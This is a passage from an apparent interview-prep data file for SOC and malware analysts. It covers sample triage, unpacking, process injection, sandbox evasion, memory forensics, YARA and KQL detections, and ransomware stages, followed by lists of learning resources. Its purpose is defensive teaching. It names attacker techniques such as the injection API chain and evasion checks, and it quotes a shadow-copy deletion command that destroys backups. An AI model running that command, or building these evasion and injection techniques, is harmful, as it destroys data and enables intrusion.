suspicious).</li>\n <li><b>Signature</b> — signed? valid? by whom? <b>Signed does not mean safe</b> — stolen certs and legitimate binaries abused via sideloading both defeat this.</li>\n <li><b>Overlay data</b> — appended data past the last PE section; often the encrypted second stage.</li>\n </ul>\n <p class=\"say\"><b>Say this:</b> \"Static analysis is where I decide how much effort the sample deserves. High entropy plus a five-function import table tells me it is packed and the imports I can see are lies — so I know immediately I need dynamic analysis or unpacking, before I have spent an hour on strings that will not be there.\"</p>",
    "caseStudy": "A sample flagged by EDR had a valid Microsoft signature — analysts almost passed it. Static showed it was a legitimate signed EXE, but the malicious component was an unsigned DLL beside it in %APPDATA%. Static analysis of the pair, not the flagged file alone, revealed DLL sideloading."
  },
  {
    "id": "03",
    "level": "l2",
    "title": "Dynamic analysis — behaviour is the durable indicator",
    "body": "<p>Detonate in an isolated environment and record what it <b>does</b>. Behaviour survives recompiles; hashes do not.</p>\n <p><b>Lab requirements — say these, interviewers check:</b></p>\n <ul><li>Isolated network (host-only), <b>INetSim</b> or FakeNet-NG to simulate internet so the malware gets responses and proceeds.</li>\n <li>Snapshot before every run, revert after. Never reuse a dirty VM.</li>\n <li>Never analyze on a domain-joined or production-adjacent host.</li></ul>\n <p><b>What you capture:</b></p>\n <table class=\"tbl\"><tr><th>Layer</th><th>Tool</th><th>Looking for</th></tr>\n <tr><td>Process</td><td>Procmon, Process Hacker</td><td>Children spawned, injection targets, command lines</td></tr>\n <tr><td>File</td><td>Procmon, FIM</td><td>Drops, self-deletion, encryption of user files</td></tr>\n <tr><td>Registry</td><td>Procmon, Regshot</td><td>Run keys, service creation, config storage</td></tr>\n <tr><td>Network</td><td>Wireshark, INetSim</td><td>C2 domains, beacon interval, user agent, exfil</td></tr>\n <tr><td>Memory</td><td>WinPmem + Volatility</td><td>Unpacked payload, injected regions, in-memory config</td></tr></table>\n <p class=\"say\"><b>Say this:</b> \"Dynamic analysis gives me detections that survive. A hash block stops one build. A behavioural rule on the process chain and the persistence mechanism stops the whole family — I have watched attackers change the hash within a week and the behaviour not at all.\"</p>",
    "caseStudy": "A sample looked benign in the sandbox — it slept and exited. I noticed it queried domain membership first. The sample was checking whether it was on a real corporate machine; the sandbox was not domain-joined, so it self-terminated. I patched the check and re-ran, and it immediately began enumerating and encrypting."
  },
  {
    "id": "04",
    "level": "l2",
    "title": "Packing and obfuscation — and how to defeat them",
    "body": "<p><b>Packing</b> compresses or encrypts the real payload and prepends a stub that unpacks it in memory at runtime. It defeats static analysis and signature AV.</p>\n <p><b>Detecting packing:</b> entropy &gt;7.2, tiny import table, non-standard section names, raw size ≪ virtual size, few readable strings.</p>\n <p><b>Unpacking approaches:</b></p>\n <ol><li><b>Known packer</b> — UPX unpacks with <code>upx -d</code>. Rare in real malware, common in commodity samples.</li>\n <li><b>Run-to-OEP</b> — let the stub unpack in memory, break at the Original Entry Point, dump the process from memory. This is the standard approach and works against most custom packers.</li>\n <li><b>Memory dump</b> — the simplest reliable method: detonate, then dump the process memory. <b>The malware must unpack itself to run, so it always ends up in cleartext in memory.</b></li>\n <li><b>Scylla / PE-sieve</b> — reconstruct the import table after dumping, since the IAT is rebuilt at runtime.</li></ol>\n <p><b>Other obfuscation you will meet:</b> string encryption (strings decrypted only when used), API hashing (resolving functions by hash instead of name so the IAT stays empty), control flow flattening, and junk code insertion.</p>\n <p class=\"say\"><b>Say this:</b> \"Packing is a delay, not a defense. The payload has to be in cleartext in memory at execution time or the CPU could not run it — so memory is always where I win. That is why I write YARA rules against the unpacked code in memory rather than the packed file on disk.\"</p>",
    "caseStudy": "A ransomware sample had a custom packer with no public unpacker. Rather than reversing the stub, I let it unpack in a debugger, broke at the OEP, and dumped from memory — 10 minutes instead of a day. Strings in the dump immediately gave me the mutex, the C2, and the extension."
  },
  {
    "id": "05",
    "level": "l2",
    "title": "Process injection — the technique family behind most EDR alerts",
    "body": "<p>Injection runs malicious code inside a legitimate process, so the network connection and file access appear to come from a trusted binary.</p>\n <table class=\"tbl\"><tr><th>Technique</th><th>How it works</th><th>Tell</th></tr>\n <tr><td><b>Classic DLL injection</b></td><td><code>VirtualAllocEx</code> → <code>WriteProcessMemory</code> → <code>CreateRemoteThread</code></td><td>Remote thread in unrelated process</td></tr>\n <tr><td><b>Process hollowing</b></td><td>Start a legit process suspended, unmap its image, write malicious PE, resume</td><td>On-disk image ≠ in-memory image</td></tr>\n <tr><td><b>Process doppelgänging</b></td><td>NTFS transactions to create a process from a file that never commits</td><td>Very few EDR hooks see it</td></tr>\n <tr><td><b>APC injection</b></td><td>Queue an async procedure call to an existing thread</td><td>No new remote thread created</td></tr>\n <tr><td><b>Reflective DLL</b></td><td>DLL maps itself, never uses LoadLibrary</td><td>Unbacked executable memory</td></tr>\n <tr><td><b>Thread hijacking</b></td><td>Suspend thread, change its context to your shellcode, resume</td><td>Unexpected thread start address</td></tr></table>\n <p><b>The universal detection:</b> executable memory regions <b>not backed by a file on disk</b>. Legitimate code is loaded from a DLL or EXE on disk; injected code is not. Volatility's <code>malfind</code> finds exactly this.</p>\n <p class=\"say\"><b>Say this:</b> \"I do not memorise all the variants — I detect the shared property. Legitimate executable memory is file-backed. Injected code lives in RWX memory with no backing file. That one property catches most of the family regardless of which specific technique was used.\"</p>",
    "caseStudy": "EDR flagged svchost.exe making outbound connections to a rare domain. svchost is legitimate — but this instance had an RWX memory region with no file backing. Volatility malfind confirmed injected shellcode. The parent chain showed it had been hollowed at process start."
  },
  {
    "id": "06",
    "level": "l3",
    "title": "Anti-analysis — why your sandbox verdict may be a lie",
    "body": "<p>Modern malware checks whether it is being watched before doing anything interesting. If you do not know these, you will report benign samples as clean.</p>\n <ul><li><b>VM detection</b> — registry keys for VMware/VirtualBox, MAC address OUI prefixes, hypervisor CPUID bit, tiny disk size, low RAM, low CPU core count.</li>\n <li><b>Sandbox detection</b> — no mouse movement, no recent documents, uptime under 10 minutes, few installed programs, usernames like \"sandbox\"/\"malware\"/\"user\".</li>\n <li><b>Time-based evasion</b> — sleep past the analysis window, or delay execution by hours/days via scheduled task. Sandboxes typically run for 2–5 minutes.</li>\n <li><b>Environment keying</b> — only runs if domain-joined, only if a specific domain name, only in a specific country by keyboard layout or geo-IP. <b>Targeted malware often will not run in your lab at all.</b></li>\n <li><b>Debugger detection</b> — <code>IsDebuggerPresent</code>, PEB flag checks, timing checks around instructions (a debugger makes them slow), <code>INT 3</code> scanning.</li>\n <li><b>Analyst tool detection</b> — checks for running Wireshark, Procmon, x64dbg, Fiddler.</li></ul>\n <p><b>Countermeasures:</b> harden the VM (realistic username, browsing history, documents, uptime, 4+ cores), patch sleep calls, use anti-anti-debug plugins (ScyllaHide), or run on bare metal.</p>\n <p class=\"say\"><b>Say this:</b> \"A clean sandbox verdict on a targeted sample is not evidence of safety — it is often evidence of anti-analysis. If the sample was delivered in a spear-phish to three finance users, and my sandbox says nothing happened, my conclusion is that my sandbox does not look like the target, not that the sample is clean.\"</p>",
    "caseStudy": "A spear-phish attachment came back clean from two sandboxes. I noticed it queried the domain name and keyboard layout before exiting. I rebuilt the VM domain-joined with the target locale and it detonated fully — a banking trojan keyed specifically to our region."
  },
  {
    "id": "07",
    "level": "l3",
    "title": "Memory forensics — where fileless malware cannot hide",
    "body": "<p>When there is nothing on disk, memory is the entire investigation.</p>\n <p><b>Acquisition:</b> WinPmem, DumpIt, or Belkasoft RAM Capturer — <b>before</b> isolation if time allows, and always before shutdown. <span class=\"warn\">Never power off a live compromised host: you lose memory, injected code, and often the ransomware encryption keys with it.</span></p>\n <p><b>Volatility 3 workflow:</b></p>\n <pre>windows.pslist        # processes from the doubly-linked list\nwindows.psscan        # scan for EPROCESS — finds hidden/unlinked processes\nwindows.pstree        # parent-child relationships\nwindows.malfind       # injected code: RWX, no file backing  ← start here\nwindows.dlllist       # loaded modules per process\nwindows.netscan       # network connections + owning PID\nwindows.cmdline       # full command lines\nwindows.handles       # mutexes, files, registry keys held\nwindows.svcscan       # services incl. maliciously created ones\nwindows.hashdump      # credential material in memory</pre>\n <p><b>The key trick:</b> compare <code>pslist</code> against <code>psscan</code>. pslist walks the OS's own process list, which a rootkit can unlink from. psscan scans raw memory for process structures. <b>A process in psscan but not pslist is actively hiding.</b></p>\n <p class=\"say\"><b>Say this:</b> \"Memory is where the malware has to be honest. It can be packed on disk, encrypted in transit, and unlinked from the process list, but to execute it must exist decrypted in RAM. That is why I acquire memory before containment whenever the timeline allows it.\"</p>",
    "caseStudy": "A fileless PowerShell loader left nothing on disk and AV was clean. Memory capture plus malfind found the injected .NET assembly. Strings from the dumped region gave us the C2 and the campaign ID, which we then hunted estate-wide and found on two more hosts."
  },
  {
    "id": "08",
    "level": "l2",
    "title": "IOCs vs behavioural detection — the Pyramid of Pain applied",
    "body": "<pre>       ▲  TTPs                        ← Tough!      (behaviour)\n      ╱ ╲  Tools                       ← Challenging\n     ╱   ╲ Network / Host Artifacts    ← Annoying\n    ╱     ╲ Domain Names               ← Simple\n   ╱       ╲ IP Addresses              ← Easy\n  ╱_________╲ Hash Values              ← Trivial</pre>\n <p>Every level up costs the adversary more to evade. Blocking a hash costs one recompile. Blocking an IP costs one new VPS. Detecting <b>how they dump credentials</b> forces them to redesign their tradecraft.</p>\n <p><b>What to extract from every sample, in order of durability:</b></p>\n <ol><li><b>Behaviour</b> (most durable) — process chains, persistence mechanism, injection technique, the sequence of actions.</li>\n <li><b>Host artifacts</b> — mutex names, service names, registry key paths, file paths, named pipes. <b>Mutexes are excellent</b> — they rarely change between builds because the malware uses them to avoid double-infecting.</li>\n <li><b>Tooling signatures</b> — YARA on unpacked code, JA3/JA3S TLS fingerprints, malleable C2 profile characteristics.</li>\n <li><b>Network</b> — C2 domains, IPs, URI patterns, user agent strings.</li>\n <li><b>Hashes</b> (least durable) — still worth blocking because it is free, but never the strategy.</li></ol>\n <p class=\"say\"><b>Say this:</b> \"I extract IOCs because they are cheap and immediate, but I write the detection at the behavioural level. In one case the hash changed within a week and the C2 within days — the process chain and the mutex name did not change at all, and that is what kept catching it.\"</p>",
    "caseStudy": "After analysing a loader I blocked the hash and C2, then wrote a Sigma rule on the behaviour: rundll32 with no command line spawned by services.exe. The hash-based block caught nothing more. The behavioural rule caught two additional infections over the following month with completely different hashes."
  },
  {
    "id": "09",
    "level": "l3",
    "title": "YARA — writing rules that actually survive",
    "body": "<p>YARA matches patterns in files, memory, and process dumps. It is how you turn one analysed sample into estate-wide detection for the whole family.</p>\n <pre>rule Loader_Family_X {\n  meta:\n    author      = \"SOC\"\n    date        = \"2026-01-15\"\n    reference   = \"INC-2291\"\n    description = \"Detects unpacked loader X in memory\"\n    hash        = \"a3f2...\"\n  strings:\n    $mutex  = \"Global\\\\x7f2a-loader\" ascii wide\n    $ua     = \"Mozilla/5.0 (compatible; MSIE 9.0)\" ascii\n    $code   = { 48 8B 05 ?? ?? ?? ?? 48 85 C0 74 ?? FF D0 }\n    $pdb    = \"C:\\\\builds\\\\loader\\\\Release\\\\\" ascii\n  condition:\n    uint16(0) == 0x5A4D and 2 of them\n}</pre>\n <p><b>Rules for good rules:</b></p>\n <ul><li>Target the <b>unpacked</b> sample or memory, not the packed file — packers change, code does not.</li>\n <li>Use hex patterns with wildcards <code>??</code> for code sequences, so recompiles still match.</li>\n <li><code>2 of them</code> rather than <code>all of them</code> — resilient to minor variant changes.</li>\n <li>Anchor with a file-format check (<code>uint16(0) == 0x5A4D</code>) to cut false positives cheaply.</li>\n <li>Avoid overly generic strings (\"error\", \"http\") — test against a clean corpus (goodware set) before deploying.</li>\n <li>Always fill <code>meta</code> — six months later you need to know why this rule exists and which incident produced it.</li></ul>\n <p class=\"say\"><b>Say this:</b> \"I test every YARA rule against a known-clean corpus before it goes anywhere near production. A rule that fires on every legitimate installer is worse than no rule, because it burns analyst trust in the whole ruleset.\"</p>",
    "caseStudy": "I wrote a rule on a distinctive mutex and a code sequence from the unpacked payload. It later matched a sample with a completely different hash, packer, and C2 — same family, new build. The mutex had not changed because the operator needed it for infection deduplication."
  },
  {
    "id": "10",
    "level": "l2",
    "title": "Ransomware anatomy — the sequence, not the encryption",
    "body": "<p>Encryption is the <b>last</b> step. Everything before it is where you actually detect and stop it.</p>\n <ol><li><b>Initial access</b> — phish, exposed RDP, unpatched edge appliance, callback phishing → RMM tool, or an initial access broker selling existing access.</li>\n <li><b>Establish and persist</b> — beacon, service, scheduled task, registry run key.</li>\n <li><b>Recon</b> — SharpHound/BloodHound, <code>net</code> commands, share enumeration. <span class=\"warn\">Detectable and often the first real signal.</span></li>\n <li><b>Credential access</b> — LSASS dump, Kerberoast, cached creds. <span class=\"warn\">The highest-value detection point.</span></li>\n <li><b>Lateral movement</b> — SMB, WMI, RDP, PsExec, WinRM.</li>\n <li><b>Privilege escalation → domain dominance</b> — often DCSync.</li>\n <li><b>Exfiltration</b> — 10s–100s of GB to cloud storage or a rented server. <b>Double extortion: they steal before they encrypt.</b></li>\n <li><b>Inhibit recovery</b> — <code>vssadmin delete shadows</code>, backup deletion, disabling security tools. <span class=\"warn\">Near-universal and very detectable.</span></li>\n <li><b>Deploy</b> — usually via GPO, PsExec, or SCCM for simultaneous mass execution.</li>\n <li><b>Encrypt + note</b>.</li></ol>\n <p><b>The encryption itself:</b> hybrid crypto — a fast symmetric key (AES) per file, with those keys wrapped in the attacker's asymmetric public key (RSA). That is why you cannot recover without their private key. Many families encrypt only the first few MB of large files for speed.</p>\n <p class=\"say\"><b>Say this:</b> \"If I am detecting ransomware at the encryption stage, I have already lost. Every step above it is detectable and most of them are noisy. Shadow copy deletion and LSASS access alone would have caught the majority of the cases I have seen.\"</p>",
    "caseStudy": "We caught a deployment at stage 4 — LSASS access on one workstation. Because I recognised the sequence rather than treating it as a single-host malware alert, we protected backups and cut lateral movement pre-emptively. Nothing was ever encrypted."
  },
  {
    "id": "11",
    "level": "l1",
    "title": "Malware families and what each tells you about intent",
    "body": "<table class=\"tbl\"><tr><th>Type</th><th>Defining property</th><th>What it implies</th></tr>\n <tr><td><b>Virus</b></td><td>Attaches to a host file, needs user execution</td><td>Legacy; rare in enterprise now</td></tr>\n <tr><td><b>Worm</b></td><td>Self-propagating with no user action</td><td>Expect fast, wide spread (WannaCry/SMB)</td></tr>\n <tr><td><b>Trojan</b></td><td>Disguised as legitimate software</td><td>User was targeted socially</td></tr>\n <tr><td><b>RAT</b></td><td>Interactive remote control</td><td><b>A human is on the keyboard</b> — urgent</td></tr>\n <tr><td><b>Loader / Dropper</b></td><td>Stage 1, fetches the real payload</td><td>Initial access broker — ransomware may follow</td></tr>\n <tr><td><b>Infostealer</b></td><td>Harvests creds, cookies, wallets</td><td>Assume all creds AND sessions gone</td></tr>\n <tr><td><b>Banking trojan</b></td><td>Web injects on banking sessions</td><td>Financially motivated, often modular</td></tr>\n <tr><td><b>Ransomware</b></td><td>Encrypts + extorts</td><td>Assume exfil already happened</td></tr>\n <tr><td><b>Wiper</b></td><td>Destroys, disguised as ransomware</td><td>Often geopolitical; paying achieves nothing</td></tr>\n <tr><td><b>Rootkit</b></td><td>Hides its own presence</td><td>Host cannot be trusted — rebuild</td></tr>\n <tr><td><b>Cryptominer</b></td><td>Steals compute</td><td>Often the visible symptom of resold access</td></tr>\n <tr><td><b>Fileless</b></td><td>Memory-only, abuses native tools</td><td>Disk forensics will find nothing</td></tr></table>\n <p class=\"say\"><b>Say this:</b> \"The classification changes my response, not just my paperwork. A miner means I go looking for how the access was obtained and who else bought it. A RAT means someone is interactive right now and I prioritise accordingly. A wiper disguised as ransomware means recovery, not negotiation.\"</p>",
    "caseStudy": "A cryptominer on a Linux server looked low priority. I treated it as evidence of an unpatched RCE that had likely been sold or reused, and hunted accordingly — finding an LD_PRELOAD rootkit and three separate persistence mechanisms the miner had distracted from."
  },
  {
    "id": "12",
    "level": "l2",
    "title": "The full analysis workflow — the answer to \"walk me through it\"",
    "body": "<p>This is the most common malware interview question. Answer with the workflow, not a tool list.</p>\n <ol><li><b>Preserve and contain first.</b> Isolate the host (EDR network isolation, not cable-pull — you keep the management channel). Capture memory before anything else. Hash the sample on acquisition.</li>\n <li><b>Automated triage.</b> VT, internal history, sandbox. Known family? Stop early and hunt.</li>\n <li><b>Static properties.</b> Entropy, imports, strings, signature, sections. Decide: packed or not?</li>\n <li><b>Dynamic.</b> Isolated VM + INetSim. Record process, file, registry, network. Unpack from memory if needed.</li>\n <li><b>Manual reversal</b> — only if the above did not answer the question that matters.</li>\n <li><b>Extract detections</b> — behaviour first, then artifacts, then IOCs. Write Sigma + YARA.</li>\n <li><b>Hunt retroactively</b> across the estate for the full retention window. <b>\"Is this bad?\" is not the question. \"Where else has this already been?\" is.</b></li>\n <li><b>Document and share</b> — report, IOCs to the platform, detections to version control, lessons to the playbook.</li></ol>\n <p class=\"say\"><b>Say this:</b> \"The analysis is not the deliverable. The deliverable is a detection that works tomorrow and an answer to where else this has been. I have closed samples at step 2 when automated triage gave me a confident family attribution and clean IOCs — spending a day reversing something already documented is not thoroughness, it is poor prioritisation.\"</p>",
    "caseStudy": "I analysed a loader in about 40 minutes — static showed packing, memory dump gave the config, and the mutex and C2 came out of strings. Then I spent three hours on the retro-hunt, which is where the actual value was: two more hosts, both dormant, both contained before execution."
  }
];

export const RESOURCES: ResourceGroup[] = [
  {
    "group": "YouTube — Channels to live on",
    "items": [
      {
        "name": "John Hammond",
        "description": "Malware analysis, CTF walkthroughs, live sample teardowns. The best free malware analysis content on YouTube.",
        "url": "https://www.youtube.com/@_JohnHammond",
        "tag": "malware"
      },
      {
        "name": "13Cubed",
        "description": "DFIR and Windows forensics. His Windows event log and memory forensics series are effectively a free course.",
        "url": "https://www.youtube.com/@13Cubed",
        "tag": "forensics"
      },
      {
        "name": "Gerald Auger — Simply Cyber",
        "description": "Daily cyber threat brief plus career/interview guidance specifically for breaking into SOC roles.",
        "url": "https://www.youtube.com/@SimplyCyber",
        "tag": "career"
      },
      {
        "name": "MyDFIR",
        "description": "Built-from-scratch SOC home lab series — Elastic, Sentinel, detections. Directly buildable.",
        "url": "https://www.youtube.com/@MyDFIR",
        "tag": "lab"
      },
      {
        "name": "The Cyber Mentor",
        "description": "Practical hacking and blue-team crossover. Understanding offense sharpens detection.",
        "url": "https://www.youtube.com/@TCMSecurityAcademy",
        "tag": "offense"
      },
      {
        "name": "LetsDefend",
        "description": "SOC analyst walkthroughs mirroring real alert triage workflows.",
        "url": "https://www.youtube.com/@LetsDefend",
        "tag": "soc"
      },
      {
        "name": "SANS Digital Forensics",
        "description": "Free conference talks and DFIR summit recordings — genuinely advanced material.",
        "url": "https://www.youtube.com/@SANSForensics",
        "tag": "dfir"
      },
      {
        "name": "Black Hat",
        "description": "Full conference talks. Search by technique when you need depth on a specific attack.",
        "url": "https://www.youtube.com/@BlackHatOfficialYT",
        "tag": "research"
      },
      {
        "name": "Microsoft Security",
        "description": "Sentinel and Defender XDR deep dives straight from the product teams — KQL and hunting content.",
        "url": "https://www.youtube.com/@MicrosoftSecurity",
        "tag": "siem"
      },
      {
        "name": "Neil Fox — MalwareAnalysisForHedgehogs",
        "description": "Step-by-step static and dynamic analysis on real samples, explained slowly.",
        "url": "https://www.youtube.com/@MalwareAnalysisForHedgehogs",
        "tag": "malware"
      }
    ]
  },
  {
    "group": "Hands-on labs (free tiers)",
    "items": [
      {
        "name": "LetsDefend",
        "description": "Free SOC analyst path with a simulated alert queue. Closest thing to real L1 work you can practise.",
        "url": "https://letsdefend.io",
        "tag": "soc"
      },
      {
        "name": "TryHackMe — SOC Level 1",
        "description": "Free rooms cover the full L1 curriculum. The Cyber Defence and Blue Team paths are the ones to do.",
        "url": "https://tryhackme.com",
        "tag": "soc"
      },
      {
        "name": "Blue Team Labs Online",
        "description": "Free investigation challenges — phishing, malware, log analysis. Report-writing focused.",
        "url": "https://blueteamlabs.online",
        "tag": "ir"
      },
      {
        "name": "CyberDefenders",
        "description": "Free DFIR and blue team CTF challenges with real PCAPs, memory images, and log sets.",
        "url": "https://cyberdefenders.org",
        "tag": "dfir"
      },
      {
        "name": "RangeForce Community",
        "description": "Free hands-on modules in a browser-based range.",
        "url": "https://www.rangeforce.com",
        "tag": "lab"
      },
      {
        "name": "Microsoft Sentinel Training Lab",
        "description": "Free Sentinel deployment with sample data for KQL practice — official Microsoft content.",
        "url": "https://github.com/Azure/Azure-Sentinel/tree/master/Sample%20Data",
        "tag": "siem"
      },
      {
        "name": "Splunk Boss of the SOC (BOTS)",
        "description": "Free downloadable datasets from Splunk's CTF. Excellent SPL practice with realistic data.",
        "url": "https://bots.splunk.com",
        "tag": "siem"
      },
      {
        "name": "DetectionLab",
        "description": "Automated build of an AD environment with logging and attack tooling for detection testing.",
        "url": "https://github.com/clong/DetectionLab",
        "tag": "lab"
      },
      {
        "name": "Atomic Red Team",
        "description": "Run individual ATT&CK techniques safely to validate whether your detections actually fire.",
        "url": "https://github.com/redcanaryco/atomic-red-team",
        "tag": "purple"
      }
    ]
  },
  {
    "group": "Malware analysis — samples and tools",
    "items": [
      {
        "name": "MalwareBazaar",
        "description": "Free live malware sample repository by abuse.ch. Handle with extreme care in an isolated lab.",
        "url": "https://bazaar.abuse.ch",
        "tag": "samples"
      },
      {
        "name": "Any.Run",
        "description": "Interactive online sandbox with a free tier — you can click inside the detonation as it runs.",
        "url": "https://any.run",
        "tag": "sandbox"
      },
      {
        "name": "Hybrid Analysis",
        "description": "Free sandbox by CrowdStrike with detailed behavioural reports.",
        "url": "https://hybrid-analysis.com",
        "tag": "sandbox"
      },
      {
        "name": "Joe Sandbox Cloud Basic",
        "description": "Free tier producing very detailed analysis reports.",
        "url": "https://www.joesandbox.com",
        "tag": "sandbox"
      },
      {
        "name": "FLARE VM",
        "description": "Free Windows malware analysis VM by Mandiant — installs the entire toolset in one script.",
        "url": "https://github.com/mandiant/flare-vm",
        "tag": "tools"
      },
      {
        "name": "REMnux",
        "description": "Free Linux distro purpose-built for malware analysis and reverse engineering.",
        "url": "https://remnux.org",
        "tag": "tools"
      },
      {
        "name": "Ghidra",
        "description": "Free reverse engineering suite from the NSA. The realistic free alternative to IDA Pro.",
        "url": "https://ghidra-sre.org",
        "tag": "tools"
      },
      {
        "name": "Volatility 3",
        "description": "The standard open-source memory forensics framework.",
        "url": "https://github.com/volatilityfoundation/volatility3",
        "tag": "tools"
      },
      {
        "name": "PMAT — Practical Malware Analysis & Triage",
        "description": "Husky Hacks' course; the lab material and much of the content is freely available.",
        "url": "https://github.com/HuskyHacks/PMAT-labs",
        "tag": "course"
      },
      {
        "name": "MalwareUnicorn Workshops",
        "description": "Free reverse engineering workshops (RE101/RE102) — outstanding structured material.",
        "url": "https://malwareunicorn.org/#/workshops",
        "tag": "course"
      }
    ]
  },
  {
    "group": "Reference — keep these open while working",
    "items": [
      {
        "name": "MITRE ATT&CK",
        "description": "The tactic/technique matrix. Tag every alert and detection with a technique ID.",
        "url": "https://attack.mitre.org",
        "tag": "framework"
      },
      {
        "name": "LOLBAS Project",
        "description": "Living-off-the-land binaries for Windows, with the exact abusive command lines.",
        "url": "https://lolbas-project.github.io",
        "tag": "reference"
      },
      {
        "name": "GTFOBins",
        "description": "The Linux equivalent — Unix binaries abusable for privilege escalation and bypasses.",
        "url": "https://gtfobins.github.io",
        "tag": "reference"
      },
      {
        "name": "Sigma HQ Rules",
        "description": "Thousands of open-source detection rules, convertible to KQL, SPL, and others.",
        "url": "https://github.com/SigmaHQ/sigma",
        "tag": "detection"
      },
      {
        "name": "The DFIR Report",
        "description": "Full intrusion reports with timelines, TTPs, and detections. The single best free source for realistic scenarios.",
        "url": "https://thedfirreport.com",
        "tag": "ir"
      },
      {
        "name": "Ultimate Windows Security — Event Encyclopedia",
        "description": "Definitive reference for every Windows Security event ID and its fields.",
        "url": "https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/",
        "tag": "reference"
      },
      {
        "name": "KQL — Must Learn KQL series",
        "description": "Rod Trent's free 20-part KQL series. The fastest route to competent Sentinel querying.",
        "url": "https://github.com/rod-trent/MustLearnKQL",
        "tag": "siem"
      },
      {
        "name": "Awesome Incident Response",
        "description": "Curated list of IR tools, playbooks, and resources.",
        "url": "https://github.com/meirwah/awesome-incident-response",
        "tag": "ir"
      },
      {
        "name": "NIST SP 800-61r2",
        "description": "The incident handling guide the four-phase lifecycle comes from. Read it once properly.",
        "url": "https://csrc.nist.gov/pubs/sp/800/61/r2/final",
        "tag": "framework"
      },
      {
        "name": "Malware Traffic Analysis",
        "description": "Free PCAPs from real infections with exercises and answers. Superb for network analysis practice.",
        "url": "https://www.malware-traffic-analysis.net",
        "tag": "network"
      }
    ]
  }
];

export const FUNDAMENTALS: Fundamental[] = [
  {
    "level": "l1",
    "category": "Networking",
    "question": "Walk me through the TCP three-way handshake and why it matters in a SOC.",
    "answer": "<p>Client sends <code>SYN</code> → server replies <code>SYN-ACK</code> → client answers <code>ACK</code>. Session established.</p>\n <p><b>Why it matters:</b> the pattern is how you tell activity apart in firewall and flow logs.</p>\n <ul><li>Many <code>SYN</code> with no <code>SYN-ACK</code> back → port scan or filtered ports.</li>\n <li>Flood of <code>SYN</code> from many sources to one host → SYN flood DoS.</li>\n <li>Full handshake completing to a rare external IP on an odd port → possible C2 or exfil worth pivoting on.</li></ul>"
  },
  {
    "level": "l1",
    "category": "Networking",
    "question": "TCP vs UDP — and which attacks favour each?",
    "answer": "<p><b>TCP</b> is connection-oriented, ordered, acknowledged — HTTP/S, SMB, RDP, SSH. <b>UDP</b> is connectionless — DNS, DHCP, SNMP, NTP, syslog.</p>\n <p>TCP is favoured for interactive C2, lateral movement, and bulk transfer. UDP is favoured for <b>amplification DDoS</b> (small spoofable request, huge reply) and <b>DNS tunnelling</b>, since UDP/53 is almost always allowed outbound.</p>"
  },
  {
    "level": "l1",
    "category": "Networking",
    "question": "Which ports should a Tier 1 analyst know cold?",
    "answer": "<pre>21 FTP     22 SSH      23 Telnet    25 SMTP\n53 DNS     67/68 DHCP  80 HTTP      88 Kerberos\n110 POP3   123 NTP     135 RPC      137-139 NetBIOS\n143 IMAP   161 SNMP    389 LDAP     443 HTTPS\n445 SMB    514 Syslog  636 LDAPS    1433 MSSQL\n3306 MySQL 3389 RDP    5432 PgSQL   5985/6 WinRM</pre>\n <p>The security-relevant ones in practice: <b>445 and 3389</b> (lateral movement), <b>88/389</b> (Kerberos/LDAP attacks), <b>53</b> (tunnelling), <b>5985/5986</b> (remote execution).</p>"
  },
  {
    "level": "l1",
    "category": "Networking",
    "question": "What does a proxy log give you that a firewall log does not?",
    "answer": "<p>Firewall gives you the connection: source, destination, port, allow/deny, bytes. Proxy gives you the <b>intent</b>: full URL, method, user agent, referrer, content type, response code, filename downloaded — and critically the <b>authenticated username</b>.</p>\n <p>Firewall tells you it happened. Proxy tells you who did it and what they fetched.</p>"
  },
  {
    "level": "l2",
    "category": "Networking",
    "question": "How do you detect DNS tunnelling?",
    "answer": "<ul><li><b>Volume anomaly</b> — one host generating far more DNS than peers.</li>\n <li><b>Long high-entropy subdomains</b> — encoded payload in the label.</li>\n <li><b>Unusual record types</b> — heavy TXT or NULL.</li>\n <li><b>High unique-subdomain count under one parent domain</b> — the strongest single indicator.</li>\n <li>Low TTLs, newly registered parent domains.</li></ul>\n <pre>DnsEvents\n| extend parent = strcat(tostring(split(Name,\".\")[-2]),\".\",\n                         tostring(split(Name,\".\")[-1]))\n| summarize uniqSub=dcount(Name), q=count() by ClientIP, parent\n| where uniqSub > 200\n| order by uniqSub desc</pre>"
  },
  {
    "level": "l2",
    "category": "Networking",
    "question": "A host is beaconing. How do you confirm it?",
    "answer": "<p>Beaconing is <b>regular, low-volume, repeated</b> outbound connection — the implant callback.</p>\n <ul><li><b>Time-delta analysis</b> — gaps between connections cluster around one interval.</li>\n <li><b>Jitter</b> — modern C2 randomises ±10–30%, so look for low standard deviation, not perfect equality.</li>\n <li>Consistent small payload sizes both directions.</li>\n <li>Persists outside business hours and survives reboot.</li>\n <li>Destination is rare for your environment, recently registered, or CDN/redirector abuse.</li></ul>\n <p>Confirm by correlating with EDR: which process owns the socket and what is its parent chain.</p>"
  },
  {
    "level": "l1",
    "category": "Windows & AD",
    "question": "Which Windows Event IDs must a SOC analyst know?",
    "answer": "<pre>4624  Successful logon        4625  Failed logon\n4634/4647  Logoff              4648  Explicit credentials (pivot)\n4662  AD object operation      4672  Special privileges (admin)\n4688  Process creation  ← most valuable\n4697  Service installed        4698/4702  Scheduled task\n4719  Audit policy changed     4720  Account created\n4726  Account deleted          4728/4732/4756  Added to group\n4740  Account locked out       4768/4769/4771  Kerberos\n5140/5145  Share accessed      7045  Service installed (System)\n1102  Audit log cleared  ← always investigate</pre>"
  },
  {
    "level": "l1",
    "category": "Windows & AD",
    "question": "What are the Windows logon types and why do they matter?",
    "answer": "<pre>2   Interactive        physical console\n3   Network            SMB, shares, remote WMI\n4   Batch              scheduled task\n5   Service            service account start\n7   Unlock\n8   NetworkCleartext   creds in the clear\n9   NewCredentials     runas /netonly  ← pivot indicator\n10  RemoteInteractive  RDP\n11  CachedInteractive  cached domain creds</pre>\n <p>Type is the fastest anomaly judgement. A service account showing <b>Type 10</b> is a red flag — service accounts should never RDP. Type 3 workstation-to-workstation is unusual and often lateral movement.</p>"
  },
  {
    "level": "l2",
    "category": "Windows & AD",
    "question": "Explain Kerberoasting and how you detect it.",
